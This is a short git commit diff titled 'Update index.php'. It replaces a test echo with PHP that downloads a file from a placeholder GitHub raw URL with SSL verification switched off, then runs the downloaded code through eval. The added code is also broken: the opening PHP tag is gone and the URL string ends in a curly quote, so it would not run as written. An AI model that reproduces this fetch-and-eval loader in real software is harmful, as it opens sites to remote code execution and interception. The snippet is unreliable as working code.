a453dba4dfb267559bdc33bc0a88a98bb2ceaa67
dokyasde <dokyasde@gmail.com>
2018-07-13 15:17:28 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,6 +1,12 @@
-<?php
-echo "tes";
-
-
-?>
-
+$GithubRawURI= "https://raw.githubusercontent.com/UserName/GitName/FileName.php”;
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $GithubRawURI);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$data = curl_exec($ch);
+curl_close($ch);
+ 
+//remove the "<?php" from the file before running it
+$data = substr($data, 5);
+ 
+eval ($data);
